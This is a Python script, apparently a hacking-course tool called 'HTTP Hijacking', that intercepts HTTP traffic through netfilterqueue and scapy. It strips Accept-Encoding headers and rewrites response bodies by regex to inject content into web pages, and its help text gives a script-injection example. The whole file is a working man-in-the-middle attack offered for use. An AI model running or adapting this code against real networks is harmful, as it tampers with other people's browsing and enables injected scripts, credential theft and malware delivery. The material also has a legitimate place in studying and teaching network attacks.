#!/usr/bin/env python3

import scapy.all as scapy
import netfilterqueue
import re
import os
import argparse
import signal

from termcolor import colored

url = set()

def def_handler(sig, frame):
    print(colored("\n[!] Quitting the program...\n", "red"))
    os._exit(1)

signal.signal(signal.SIGINT, def_handler)

def get_arguments():
    # separator: <#>
    # Matches: <title>.*</title><#></body>
    # Loads: <title>H4cked ;D</title><#></body><script>alert('XSS');</script>

    argparser = argparse.ArgumentParser()
    argparser.add_argument("-m", "--matches", required=True, dest="matches", help="Specify the patterns to match in the HTML page, use '<#>' as the separator. (Ex: <title>.*</title><#></body>)")
    argparser.add_argument("-l", "--loads", required=True, dest="loads", help="Provide the replacement values to apply when a match is found in the HTML page, use '<#>' as the separator. (Ex: <title>H4cked ;D</title><#></body><script>alert('XSS');</script>)")

    args = argparser.parse_args()

    return args.matches, args.loads


def set_load(packet, load):
    packet[scapy.Raw].load = load

    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum

    return packet

def replace_loads(packet, matches, loads):

    for i in range(len(matches)):
        global url

        match = matches[i]
        load = loads[i]
        
        current_load = packet[scapy.Raw].load
        modified_load = re.sub(match, load, current_load)
        if current_load != modified_load:
            print(colored(f"\t+) Replacing: {match} --> {load}.\n", "green"))
        packet = set_load(packet, modified_load)
    

    return packet


def process_packet(packet, matches, loads, length):
    global url

    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.Raw):
        try:
            if length == 0:
                if scapy_packet[scapy.TCP].dport == 80:
                    modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
                    scapy_packet = set_load(scapy_packet, modified_load)
                elif scapy_packet[scapy.TCP].sport == 80:
                    scapy_packet = replace_loads(scapy_packet, matches, loads)

                packet.set_payload(scapy_packet.build())
        except:
            pass

    packet.accept()

def print_banner():
    print(colored("""
█░█ ▀█▀ ▀█▀ █▀█   █░█ █ ░░█ ▄▀█ █▀▀ █▄▀ █ █▄░█ █▀▀
█▀█ ░█░ ░█░ █▀▀   █▀█ █ █▄█ █▀█ █▄▄ █░█ █ █░▀█ █▄█\n""", 'white'))

    print(colored("""Mᴀᴅᴇ ʙʏ sᴀᴍᴍʏ-ᴜʟғʜ\n""", 'yellow'))

def verify(matches, loads):
    if os.getuid() != 0:
        print(colored("\n[!] Root privilegues are required.\n", "yellow"))
        os._exit(1)

    try:
        if matches and loads:
            matches, loads = [[match.encode() for match in matches.split('<#>')], [load.encode() for load in loads.split('<#>')]]
        else:
            print(colored("\n[!] Unknown arguments.\n", "yellow"))
    except Exception as e:
        print(colored("\n[!] Invalid arguments format.\n", "red"))
        os._exit(1)

    length = len(matches) - len(loads)
   
    if length:
        print(colored("\n[!] The number of matches and replacements must be equal to perform one-to-one replacements.\n", "red"))
        os._exit(1)
    else:
        print(colored("\n[+] Capturing and Modifying All HTTP Trafic:\n", "blue"))

    return matches, loads, length

def main():

    print_banner()
    matches, loads = get_arguments()
    matches, loads, length = verify(matches, loads)
    
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, lambda pkt: process_packet(pkt, matches, loads, length))
    queue.run()

if __name__ == "__main__":
    main()
